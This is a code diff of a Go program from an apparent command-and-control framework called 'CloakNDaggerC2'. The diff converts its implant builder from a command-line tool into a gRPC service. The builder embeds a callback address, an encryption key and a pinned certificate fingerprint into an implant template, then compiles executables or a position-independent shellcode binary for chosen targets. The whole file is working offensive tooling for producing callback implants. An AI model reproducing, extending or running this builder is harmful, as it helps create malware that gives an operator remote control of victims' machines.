@@ -1,9 +1,14 @@
 // Original code from https://levelup.gitconnected.com/writing-a-code-generator-in-go-420e69151ab1
 // Prod
+// We need to convert this to be a gRPC server
+// It will await connections and then run through it's builder routine
+// The return will be a response code either 0 or 1
+// It will also need to send data to the API
 
 package main
 
 import (
+	"context"
 	"crypto/sha256"
 	"crypto/x509"
 	"embed"
@@ -11,11 +16,17 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"strings"
 	"text/template"
 	"uuid"
+
+	pb "CloakNDaggerC2/dagger/proto/daggerProto"
+
+	"google.golang.org/grpc"
+	"google.golang.org/protobuf/proto"
 )
 
 func StrH(s string) uint32 {
@@ -30,6 +41,13 @@ var (
 	//go:embed templates/*.tmpl
 	rootFs embed.FS
 )
+
+type ImplantStruct struct {
+	platform         string
+	architecture     string
+	name             string
+	listener_address string
+}
 
 type appValues struct {
 	CallBack    string
@@ -60,54 +78,56 @@ func calculatePublicKeyHash(publicKeyPEM []byte) (string, error) {
 	return fmt.Sprintf("%x", hash), nil
 }
 
-func main() {
+type Builder struct {
+	pb.UnimplementedBuilderServer
+}
+
+func (s *Builder) StartBuilding(ctx context.Context, in *pb.BuildRoutine) (*pb.ReponseCode, error) {
+	// Generate and format the UUID
 	uuidWithHyphen := uuid.New()
 	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
 
-	if os.Args[1] == "help" {
-		fmt.Printf("Need platform, architecture, output file name, and callback URL >>> ./builder windows amd64 tempExe http://192.168.1.179:8000\n")
-		fmt.Printf("For a PIE, need platform, pie keyword, output file name, and callback URL >>> ./builder windows pie tempExe http://192.168.1.179:8000 \n")
-		os.Exit(1)
-	}
-
-	mydir, _ := os.Getwd()
-	var (
-		err       error
-		fp        *os.File
-		templates *template.Template
-	)
-
+	// Initialize the values struct
 	values := appValues{}
-	fmt.Printf("=|---> Dagger generator <---|= \n")
 
-	// execute python script to generate keys
-	genKey := exec.Command("python3", "crypter.py", uuid)
-	out, err := genKey.Output()
-	if err != nil {
-		log.Fatal(err)
+	// Get the data we want to use
+	ImplantInfo := &pb.BuildRoutine{
+		Platform:        in.GetPlatform(),
+		Architecture:    in.GetArchitecture(),
+		Name:            in.GetName(),
+		ListenerAddress: in.GetListenerAddress(),
 	}
-	fmt.Printf("Keys generated \n")
-	// read the global key
+
+	data, err := proto.Marshal(ImplantInfo)
+	if err != nil {
+		log.Fatalln(err)
+		return nil, err
+	}
+
+	unmarshaled_data := pb.BuildRoutine{}
+	proto.Unmarshal(data, &unmarshaled_data)
+	fmt.Printf("ffs1 global.pem\n")
 	pubPEM, err := ioutil.ReadFile("../global.pub.pem")
 	if err != nil {
-		panic(err)
+		log.Fatalln(err)
+		return nil, err
 	}
-	fmt.Printf("Keys read \n")
-	//hash, _ := calculatePublicKeyHash(pubPEM)
+
 	string_pem := string(pubPEM)
 	string_pem_no_newLines := strings.Replace(string_pem, "\n", "", -1)
 	// Here we need to trim the start and end from the string
 	string_pem_no_newLines = string_pem_no_newLines[:len(string_pem_no_newLines)-24]
 	string_pem_no_newLines = string_pem_no_newLines[26:len(string_pem_no_newLines)]
-
-	certPEM, err := ioutil.ReadFile("../Listeners/testServer.crt")
+	certPEM, err := ioutil.ReadFile("templates/testServer.crt")
 
 	// I'm banging my head against a wall trying to trim the fingerprint in golang
 	// let's do it in bash
-	out, err = exec.Command("openssl", "x509", "-in", "../Listeners/testServer.crt", "-fingerprint", "-sha256").Output()
+	out, err := exec.Command("openssl", "x509", "-in", "templates/testServer.crt", "-fingerprint", "-sha256").Output()
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
+		return nil, err
 	}
+
 	// we've now got the output, so let's trim to the first line in Go
 	outstr := string(out)
 	lines := strings.Split(outstr, "\n")
@@ -116,11 +136,8 @@ func main() {
 	res := parts[1]
 	res = strings.ReplaceAll(res, ":", "")
 	res = strings.ToLower(res)
-	fmt.Printf(res)
-	fmt.Printf("\n")
-	// Get the string hash of the fingerprint
-	sh := StrH(res)
-	values.Fingerprint = sh
+	h1 := StrH(res)
+	values.Fingerprint = h1
 
 	string_cert := string(certPEM)
 	//hash, _ := calculatePublicKeyHash(certPEM)
@@ -129,66 +146,108 @@ func main() {
 	string_cert_no_newLines = string_cert_no_newLines[:len(string_cert_no_newLines)-25]
 	string_cert_no_newLines = string_cert_no_newLines[27:len(string_cert_no_newLines)]
 
-	values.CallBack = os.Args[4]
-	values.AppName = os.Args[3]
+	values.CallBack = in.ListenerAddress
+	values.AppName = in.Name
 	values.UUID = uuid
 	values.Pubkey = string_pem_no_newLines
 	values.ServerKey = string_cert_no_newLines
 
+	// Get the current working dir
+	mydir, _ := os.Getwd()
 	rootFsMapping := map[string]string{
 		"dagger.go.tmpl": mydir + "/templates/" + values.AppName + ".go",
 	}
+
 	fmt.Printf("Template mapped \n")
+	var (
+		fp        *os.File
+		templates *template.Template
+	)
 	/*
 	 * Process templates
 	 */
 	if templates, err = template.ParseFS(rootFs, "templates/*.tmpl"); err != nil {
 		log.Fatalln(err)
+		return nil, err
 	}
 
+	// Check if the template exists
 	for templateName, outputPath := range rootFsMapping {
 		if fp, err = os.Create(outputPath); err != nil {
 			log.Fatalln(err)
+			return nil, err
 		}
 
 		defer fp.Close()
 
 		if err = templates.ExecuteTemplate(fp, templateName, values); err != nil {
 			log.Fatalln(err)
+			return nil, err
 		}
 	}
 	fmt.Printf("Template executed \n")
-	switch os.Args[2] {
+	switch in.GetArchitecture() {
 	case "pie":
 		fmt.Printf(" Generating PIE \n")
-		os.Setenv("GOOS", "windows")
-		os.Setenv("GOARCH", "amd64")
-		appNamePath := mydir + "/templates/" + values.AppName + ".go"
+		appNamePath := "templates/" + values.AppName + ".go"
 		setEnvVarExec := exec.Command("go", "build", "-buildmode", "pie", "-o", "shellcode.bin", appNamePath)
 		out, err = setEnvVarExec.Output()
 		if err != nil {
-			log.Fatal(err)
+			ResponseCode := &pb.ReponseCode{
+				Code: 1,
+			}
+			return ResponseCode, err
 		}
-		res := string(out)
-		fmt.Printf(res)
-		fmt.Printf(" Done, output shellcode.bin \n")
+		ResponseCode := &pb.ReponseCode{
+			Code: 0,
+		}
+		return ResponseCode, err
 
 	default:
 		// We set the app name and full path here for use later
-		appNamePath := mydir + "/templates/" + values.AppName + ".go"
+		appNamePath := "templates/" + values.AppName + ".go"
 		// we set these as global compile options
-		os.Setenv("GOOS", os.Args[1])
-		os.Setenv("GOARCH", os.Args[2])
+		os.Setenv("GOOS", in.GetPlatform())
+		os.Setenv("GOARCH", in.GetArchitecture())
 		fmt.Printf("Set env variables \n")
 
 		// after setting environment variables, we compile using go build and the path to the file
 		setEnvVarExec := exec.Command("go", "build", appNamePath)
 		out, err = setEnvVarExec.Output()
 		if err != nil {
-			log.Fatal(err)
+			ResponseCode := &pb.ReponseCode{
+				Code: 1,
+			}
+			return ResponseCode, err
 		}
-		res := string(out)
-		fmt.Printf(res)
-		fmt.Printf(" Done \n")
+		ResponseCode := &pb.ReponseCode{
+			Code: 0,
+		}
+		return ResponseCode, err
+	}
+
+}
+
+const (
+	// Port for gRPC server to listen to
+	// The builder will run on port 3
+	PORT = ":50053"
+)
+
+func main() {
+	lis, err := net.Listen("tcp", PORT)
+
+	if err != nil {
+		log.Fatalf("failed connection: %v", err)
+	}
+
+	s := grpc.NewServer()
+
+	pb.RegisterBuilderServer(s, &Builder{})
+
+	log.Printf("server listening at %v", lis.Addr())
+
+	if err := s.Serve(lis); err != nil {
+		log.Fatalf("failed to server: %v", err)
 	}
 }
